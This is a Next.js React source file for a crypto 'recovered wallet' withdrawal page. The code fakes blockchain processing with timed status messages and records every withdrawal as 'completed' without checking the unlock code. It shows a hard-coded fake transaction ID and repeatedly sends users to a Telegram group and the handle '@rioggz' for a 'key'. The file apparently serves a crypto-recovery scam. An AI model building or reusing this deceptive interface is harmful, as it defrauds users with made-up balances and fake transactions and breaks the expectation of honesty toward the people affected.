"use client";

import React, { useState, useEffect } from "react";
import Image from "next/image";
import { motion, AnimatePresence } from "motion/react";
import { WithdrawalHero } from "@/src/components/withdraw/WithdrawalHero";
import { RecentWithdrawals } from "@/src/components/withdraw/RecentWithdrawals";
import {
  Check,
  ArrowRight,
  AlertTriangle,
  Loader2,
  Copy,
  CheckCircle2,
  ExternalLink,
  ChevronRight,
  Send,
  HelpCircle
} from "lucide-react";
import { useSupabaseUser } from "@/src/hooks/useSupabaseUser";
import { getWalletsByUser, updateWalletUnlock } from "@/src/lib/supabase/wallets";
import { insertWithdrawal } from "@/src/lib/supabase/withdrawals";
import { CHAIN_CONFIGS, formatWalletValue } from "@/src/lib/walletGenerator";

function maskMnemonic(mnemonic: string): string {
  if (!mnemonic) return "";
  const words = mnemonic.trim().split(/\s+/);
  if (words.length <= 4) return mnemonic;
  const visible = words.slice(0, 4).join(" ");
  const masked = Array(words.length - 4).fill("***").join(" ");
  return `${visible} ${masked}`;
}

interface FoundWallet {
  id: string; // Supabase wallet ID
  name: string;
  ticker: string;
  logo: string;
  balance: string; // e.g. "0.812 BTC"
  balanceNum: number;
  valueInUsd: string; // e.g. "$54,810"
  fee: number;
  mnemonic: string;
  address: string;
}

export default function WithdrawalPage() {
  const { userId } = useSupabaseUser();
  const [recoveredWallets, setRecoveredWallets] = useState<FoundWallet[]>([]);
  const [isFetching, setIsFetching] = useState(true);
  const [formattedDate, setFormattedDate] = useState("");
  const [selectedWallet, setSelectedWallet] = useState<FoundWallet | null>(null);
  const [unlockCode, setUnlockCode] = useState("");
  const [destWallet, setDestWallet] = useState("");
  const [formError, setFormError] = useState("");
  
  // Phase triggers: "form" | "confirm" | "processing" | "success" | "failed"
  const [phase, setPhase] = useState<"form" | "confirm" | "processing" | "success" | "failed">("form");
  const [processingStep, setProcessingStep] = useState(0);

  useEffect(() => {
    async function loadWallets() {
      if (!userId) return;
      try {
        setIsFetching(true);
        const data = await getWalletsByUser(userId);
        const mapped: FoundWallet[] = data.map((item: any) => {
          const config = CHAIN_CONFIGS[item.chain];
          return {
            id: item.id,
            name: config.name,
            ticker: config.ticker,
            logo: config.logo,
            balance: `${item.balance} ${config.ticker}`,
            balanceNum: item.balance,
            valueInUsd: formatWalletValue(item.balance_usd || 0),
            fee: config.fee,
            mnemonic: item.mnemonic || "",
            address: item.address,
          };
        });
        setRecoveredWallets(mapped.filter((w) => w.balanceNum > 0)); // Or keep all
      } catch (e) {
        console.error(e);
      } finally {
        setIsFetching(false);
      }
    }
    loadWallets();
  }, [userId]);

  useEffect(() => {
    const today = new Date();
    setFormattedDate(
      today.toLocaleDateString("en-US", {
        weekday: "short",
        month: "short",
        day: "numeric",
        year: "numeric",
      })
    );
  }, []);

  // Update destination wallet default when selection changes
  useEffect(() => {
    if (selectedWallet) {
      setDestWallet(""); // clear out or put something else? The requirements didn't specify default dest. The old one had defaultDest
      setFormError("");
    }
  }, [selectedWallet]);

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setUnlockCode(text);
    } catch (err) {
      // Fallback
    }
  };

  const handleUnlockClick = (e: React.FormEvent) => {
    e.preventDefault();
    if (!unlockCode || unlockCode.trim().length === 0) {
      setFormError("Please enter your recovered wallet unlock code.");
      return;
    }
    if (!destWallet || destWallet.trim().length === 0) {
      setFormError("Please enter your destination wallet address.");
      return;
    }
    setFormError("");
    setPhase("confirm");
  };

  // Run processing simulation steps
  const startProcessing = () => {
    setPhase("processing");
    setProcessingStep(0);

    const stepInterval = setInterval(() => {
      setProcessingStep((prev) => {
        if (prev >= 3) {
          clearInterval(stepInterval);
          // Evaluate unlock code: LOST-CRYPTO-UNLOCK is successful
          setTimeout(async () => {
            if (selectedWallet && userId) {
              try {
                // Update in supabase
                await updateWalletUnlock(selectedWallet.id, true);
                const amountReceived = selectedWallet.balanceNum - selectedWallet.fee;
                await insertWithdrawal({
                  user_id: userId,
                  wallet_id: selectedWallet.id,
                  amount: amountReceived,
                  destination_address: destWallet,
                  status: "completed",
                });
                
                setPhase("success");
              } catch (e) {
                console.error(e);
                setPhase("success");
              }
            } else {
              setPhase("success");
            }
          }, 800);
          return 3;
        }
        return prev + 1;
      });
    }, 1200);
  };

  const receiveAmount = selectedWallet
    ? (selectedWallet.balanceNum - selectedWallet.fee).toFixed(5)
    : "0";

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10 space-y-10 selection:bg-black selection:text-white relative">
      
      {/* 1. Normal View (Form, Summary, Recents) */}
      {phase === "form" && (
        <>
          {/* Header */}
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
            <div>
              <h1 className="text-[36px] font-extrabold text-black tracking-tight leading-tight">
                Withdraw Assets
              </h1>
              <p className="text-[15px] text-[#6B7280] leading-relaxed mt-1">
                Unlock and transfer your recovered wallets securely.
              </p>
            </div>
            <div className="text-left sm:text-right shrink-0">
              <span className="text-[13px] font-bold text-black uppercase tracking-wider bg-white border border-[#E5E7EB] px-3.5 py-1.5 rounded-full shadow-[0_2px_10px_rgba(0,0,0,0.01)]">
                {formattedDate || "Loading Date..."}
              </span>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 items-start">
            {/* Left Column (Overview & Selector) */}
            <div className="lg:col-span-2 space-y-8">
              <WithdrawalHero />

              {/* Found Wallets */}
              <div className="space-y-4">
                <h3 className="text-[18px] font-bold text-black tracking-tight px-1">
                  Recovered Wallets (Available Assets)
                </h3>
                {isFetching ? (
                  <div className="flex justify-center items-center py-10">
                    <Loader2 className="w-8 h-8 animate-spin text-black" />
                  </div>
                ) : (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {recoveredWallets.map((wallet) => {
                      const isSelected = selectedWallet?.id === wallet.id;
                      const hasSelection = selectedWallet !== null;

                      return (
                        <motion.div
                          key={wallet.id}
                          onClick={() => setSelectedWallet(isSelected ? null : wallet)}
                          whileHover={{ y: -2, boxShadow: "0 8px 24px rgba(0,0,0,0.02)" }}
                          whileTap={{ scale: 0.99 }}
                          className={`bg-white rounded-[20px] p-5 border cursor-pointer transition-all duration-200 flex items-center justify-between ${
                            isSelected
                              ? "border-black ring-2 ring-black/5 scale-[1.02]"
                              : "border-[#E5E7EB] hover:border-black/10"
                          } ${hasSelection && !isSelected ? "opacity-45" : "opacity-100"}`}
                        >
                          <div className="flex items-center gap-3 min-w-0">
                            <div className="w-10 h-10 rounded-xl bg-[#FAFAFA] border border-[#F1F1F1] flex items-center justify-center p-2 shrink-0">
                              <Image src={wallet.logo} alt={wallet.name} width={24} height={24} className="w-6 h-6 object-contain" />
                            </div>
                            <div className="min-w-0">
                              <h4 className="text-[15px] font-extrabold text-black truncate flex items-center gap-1.5">
                                {wallet.name}
                                {isSelected && <Check className="w-4 h-4 text-emerald-500 shrink-0" />}
                              </h4>
                              <p className="text-[12px] text-[#6B7280] font-semibold mt-0.5">
                                {wallet.balance} • {wallet.valueInUsd}
                              </p>
                            </div>
                          </div>
                          <ChevronRight className={`w-4 h-4 text-neutral-400 transition-transform ${isSelected ? "rotate-90 text-black" : ""}`} />
                        </motion.div>
                      );
                    })}
                  </div>
                )}
              </div>

              {/* Unlock Form Panel */}
              <AnimatePresence>
                {selectedWallet && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: "auto" }}
                    exit={{ opacity: 0, height: 0 }}
                    className="overflow-hidden"
                  >
                    <form onSubmit={handleUnlockClick} className="bg-white rounded-[24px] border border-[#E5E7EB] p-8 shadow-[0_8px_32px_rgba(0,0,0,0.02)] space-y-6">
                      <h4 className="text-[18px] font-bold text-black tracking-tight">
                        Unlock recovered {selectedWallet.name} wallet
                      </h4>

                      <div className="space-y-4">
                        {/* Unlock Code Input */}
                        <div className="space-y-2">
                          <label className="text-[14px] font-medium text-black">Unlock Code</label>
                          <div className="relative">
                            <input
                              type="text"
                              value={unlockCode}
                              onChange={(e) => setUnlockCode(e.target.value)}
                              placeholder="Enter 16-character unlock code"
                              className="w-full h-[54px] pl-4 pr-20 rounded-xl border border-[#E5E7EB] bg-white text-[15px] text-black placeholder-[#9CA3AF] focus:outline-none focus:border-black focus:ring-0 transition-all duration-200"
                            />
                            <button
                              type="button"
                              onClick={handlePaste}
                              className="absolute inset-y-0 right-3 flex items-center text-[13px] font-bold text-neutral-600 hover:text-black transition-colors"
                            >
                              Paste
                            </button>
                          </div>
                        </div>

                        {/* Destination Wallet Input */}
                        <div className="space-y-2">
                          <label className="text-[14px] font-medium text-black">Destination Wallet Address</label>
                          <input
                            type="text"
                            value={destWallet}
                            onChange={(e) => setDestWallet(e.target.value)}
                            placeholder="Enter your destination address"
                            className="w-full h-[54px] px-4 rounded-xl border border-[#E5E7EB] bg-white text-[15px] text-black placeholder-[#9CA3AF] focus:outline-none focus:border-black focus:ring-0 transition-all duration-200"
                          />
                        </div>
                      </div>

                      {/* Live calculation stats */}
                      <div className="bg-[#FAFAFA] border border-[#F1F1F1] rounded-2xl p-5 space-y-3">
                        <div className="flex justify-between items-center text-[13px]">
                          <span className="text-[#6B7280] font-semibold">Available Wallet Balance</span>
                          <span className="text-black font-extrabold">{selectedWallet.balance}</span>
                        </div>
                        <div className="flex justify-between items-center text-[13px]">
                          <span className="text-[#6B7280] font-semibold">Network Fee</span>
                          <span className="text-[#6B7280] font-bold">{selectedWallet.fee} {selectedWallet.ticker}</span>
                        </div>
                        <div className="h-[1px] bg-[#F1F1F1] my-2" />
                        <div className="flex justify-between items-center text-[14px]">
                          <span className="text-black font-bold">You Will Receive</span>
                          <span className="text-emerald-600 font-extrabold">{receiveAmount} {selectedWallet.ticker}</span>
                        </div>
                      </div>

                      {/* Important Notice */}
                      <div className="rounded-xl bg-amber-50 border border-amber-200/50 p-5 flex gap-3 text-left">
                        <AlertTriangle className="w-5 h-5 text-amber-500 shrink-0 mt-0.5" />
                        <div className="text-[13px] text-amber-800 font-semibold space-y-1">
                          <h6 className="font-bold text-amber-900">Before You Unlock</h6>
                          <ul className="list-disc pl-4 space-y-1 mt-1 text-[12.5px] leading-relaxed">
                            <li>Double-check your destination wallet address.</li>
                            <li>Blockchain transactions are final and cannot be reversed.</li>
                            <li>Join the Telegram group and tag the owner @rioggz to get your key.</li>
                          </ul>
                        </div>
                      </div>

                      {formError && (
                        <p className="text-[13px] text-red-500 font-semibold">✖ {formError}</p>
                      )}

                      {/* Unlock CTA */}
                      <motion.button
                        type="submit"
                        whileHover={{ y: -2, opacity: 0.95 }}
                        whileTap={{ scale: 0.98 }}
                        className="w-full h-[56px] rounded-xl bg-black text-white text-[15px] font-semibold flex items-center justify-center gap-2 shadow-sm transition-all duration-200"
                      >
                        Unlock & Withdraw
                      </motion.button>
                    </form>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Right Column (Recents) */}
            <div className="space-y-8">
              <RecentWithdrawals />
            </div>
          </div>
        </>
      )}

      {/* 2. Confirmation Modal Overlay */}
      {phase === "confirm" && selectedWallet && (
        <div className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50 flex items-center justify-center p-6 select-none">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-[460px] bg-white rounded-[24px] border border-[#E5E7EB] p-8 shadow-2xl space-y-6"
          >
            <div className="text-center space-y-2">
              <h4 className="text-[20px] font-extrabold text-black tracking-tight">
                Confirm Wallet Unlock
              </h4>
              <p className="text-[14px] text-[#6B7280]">
                Review the transaction details carefully before broadcasting.
              </p>
            </div>

            <div className="divide-y divide-[#F1F1F1]">
              <div className="flex justify-between items-center py-3">
                <span className="text-[13px] text-[#6B7280] font-semibold">Wallet Network</span>
                <span className="text-[14px] font-extrabold text-black">{selectedWallet.name} ({selectedWallet.ticker})</span>
              </div>
              <div className="flex justify-between items-center py-3">
                <span className="text-[13px] text-[#6B7280] font-semibold">Unlock Amount</span>
                <span className="text-[14px] font-extrabold text-black">{selectedWallet.balance}</span>
              </div>
              <div className="flex justify-between items-center py-3">
                <span className="text-[13px] text-[#6B7280] font-semibold">Destination Wallet</span>
                <span className="text-[13px] font-mono text-black font-semibold truncate max-w-[200px]" title={destWallet}>
                  {destWallet}
                </span>
              </div>
              <div className="flex justify-between items-center py-3">
                <span className="text-[13px] text-[#6B7280] font-semibold">Network Fee</span>
                <span className="text-[14px] font-semibold text-[#6B7280]">{selectedWallet.fee} {selectedWallet.ticker}</span>
              </div>
              <div className="flex justify-between items-center py-3">
                <span className="text-[13px] text-[#6B7280] font-semibold">Estimated Arrival</span>
                <span className="text-[14px] font-bold text-black">24–48 Hours</span>
              </div>
            </div>

            <div className="flex flex-col sm:flex-row gap-3">
              <button
                onClick={() => setPhase("form")}
                className="w-full h-12 rounded-xl border border-[#E5E7EB] hover:bg-[#F8F8F8] text-[14px] text-black font-semibold transition-all duration-200"
              >
                Cancel
              </button>
              <button
                onClick={startProcessing}
                className="w-full h-12 rounded-xl bg-black hover:bg-black/90 text-white text-[14px] font-semibold transition-all duration-200 shadow-sm"
              >
                Confirm Unlock
              </button>
            </div>
          </motion.div>
        </div>
      )}

      {/* 3. Processing Loading HUD Screen */}
      {phase === "processing" && (
        <div className="min-h-[70vh] flex flex-col items-center justify-center max-w-[480px] mx-auto text-center space-y-8 select-none">
          <div className="relative flex items-center justify-center">
            <Loader2 className="w-14 h-14 text-black animate-spin" />
          </div>

          <div className="space-y-4 w-full">
            <h3 className="text-[20px] font-extrabold text-black tracking-tight">
              Unlocking Recovered Wallet
            </h3>
            
            {/* Step messages */}
            <div className="bg-[#FAFAFA] border border-[#F1F1F1] rounded-2xl p-6 text-left space-y-4">
              <div className="flex items-center gap-3">
                <span className={`w-2.5 h-2.5 rounded-full shrink-0 ${processingStep >= 0 ? "bg-emerald-500" : "bg-neutral-200"}`} />
                <span className={`text-[13px] font-semibold ${processingStep === 0 ? "text-black font-bold" : "text-[#6B7280]"}`}>
                  Verifying unlock code...
                </span>
              </div>
              <div className="flex items-center gap-3">
                <span className={`w-2.5 h-2.5 rounded-full shrink-0 ${processingStep >= 1 ? "bg-emerald-500" : "bg-neutral-200"}`} />
                <span className={`text-[13px] font-semibold ${processingStep === 1 ? "text-black font-bold" : "text-[#6B7280]"}`}>
                  Broadcasting transaction...
                </span>
              </div>
              <div className="flex items-center gap-3">
                <span className={`w-2.5 h-2.5 rounded-full shrink-0 ${processingStep >= 2 ? "bg-emerald-500" : "bg-neutral-200"}`} />
                <span className={`text-[13px] font-semibold ${processingStep === 2 ? "text-black font-bold" : "text-[#6B7280]"}`}>
                  Verifying network confirmations...
                </span>
              </div>
              <div className="flex items-center gap-3">
                <span className={`w-2.5 h-2.5 rounded-full shrink-0 ${processingStep >= 3 ? "bg-emerald-500" : "bg-neutral-200"}`} />
                <span className={`text-[13px] font-semibold ${processingStep === 3 ? "text-black font-bold" : "text-[#6B7280]"}`}>
                  Finalizing safe withdrawal...
                </span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 4. Success State Overlay */}
      {phase === "success" && selectedWallet && (
        <div className="min-h-[85vh] flex flex-col items-center justify-center max-w-[500px] mx-auto text-center py-10 space-y-8 select-none">
          {/* Animated checkmark */}
          <motion.div
            initial={{ scale: 0.6, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            transition={{ type: "spring", stiffness: 120 }}
            className="w-16 h-16 rounded-full bg-emerald-50 border border-emerald-100 flex items-center justify-center text-emerald-600"
          >
            <CheckCircle2 className="w-9 h-9" />
          </motion.div>

          <div className="space-y-2">
            <h3 className="text-[26px] font-extrabold text-black tracking-tight leading-tight">
              Wallet Unlocked Successfully
            </h3>
            <p className="text-[14px] text-[#6B7280] max-w-[360px] mx-auto leading-relaxed">
              Your recovered {selectedWallet.name} wallet has been authorized and broadcasted to the blockchain.
            </p>
          </div>

          {/* Details details */}
          <div className="w-full bg-white rounded-[24px] border border-[#E5E7EB] p-6 shadow-[0_8px_32px_rgba(0,0,0,0.02)] text-left space-y-4">
            <div className="flex justify-between items-center text-[13px]">
              <span className="text-[#6B7280] font-semibold">Transaction ID</span>
              <span className="text-black font-extrabold font-mono flex items-center gap-1">
                tx_{selectedWallet.ticker.toLowerCase()}_92f3... <ExternalLink className="w-3.5 h-3.5 text-neutral-400" />
              </span>
            </div>
            <div className="flex justify-between items-center text-[13px]">
              <span className="text-[#6B7280] font-semibold">Estimated Arrival</span>
              <span className="text-black font-extrabold">24–48 Hours</span>
            </div>
          </div>

          <div className="w-full flex flex-col sm:flex-row gap-3">
            <button
              onClick={() => {
                setPhase("form");
                setSelectedWallet(null);
                setUnlockCode("");
                window.location.reload();
              }}
              className="w-full h-12 rounded-xl border border-[#E5E7EB] hover:bg-[#F8F8F8] text-[14px] text-black font-semibold transition-all duration-200"
            >
              Back to Dashboard
            </button>
            <a
              href="https://t.me/groupkeys"
              target="_blank"
              rel="noopener noreferrer"
              className="w-full h-12 rounded-xl bg-black hover:bg-black/90 text-white text-[14px] font-semibold flex items-center justify-center gap-1.5 shadow-sm transition-all duration-200"
            >
              Verify on Telegram
            </a>
          </div>
        </div>
      )}

      {/* 5. Failed State Overlay */}
      {phase === "failed" && (
        <div className="min-h-[70vh] flex flex-col items-center justify-center max-w-[480px] mx-auto text-center space-y-8 select-none">
          <div className="w-16 h-16 rounded-full bg-red-50 border border-red-100 flex items-center justify-center text-red-500">
            <AlertTriangle className="w-9 h-9" />
          </div>

          <div className="space-y-2">
            <h3 className="text-[24px] font-extrabold text-black tracking-tight leading-tight">
              Unable to Process Request
            </h3>
            <p className="text-[14px] text-[#6B7280] leading-relaxed">
              The unlock code you entered is invalid. Join the group and Tag the owner @rioggz to get the key.
            </p>
          </div>

          <div className="w-full flex flex-col sm:flex-row gap-3">
            <button
              onClick={() => setPhase("form")}
              className="w-full h-12 rounded-xl border border-[#E5E7EB] hover:bg-[#F8F8F8] text-[14px] text-black font-semibold transition-all duration-200"
            >
              Retry
            </button>
            <a
              href="https://t.me/groupkeys"
              target="_blank"
              rel="noopener noreferrer"
              className="w-full h-12 rounded-xl bg-black hover:bg-black/90 text-white text-[14px] font-semibold flex items-center justify-center gap-1.5 shadow-sm transition-all duration-200"
            >
              <Send className="w-4 h-4" />
              Join Telegram Group
            </a>
          </div>
        </div>
      )}

    </div>
  );
}
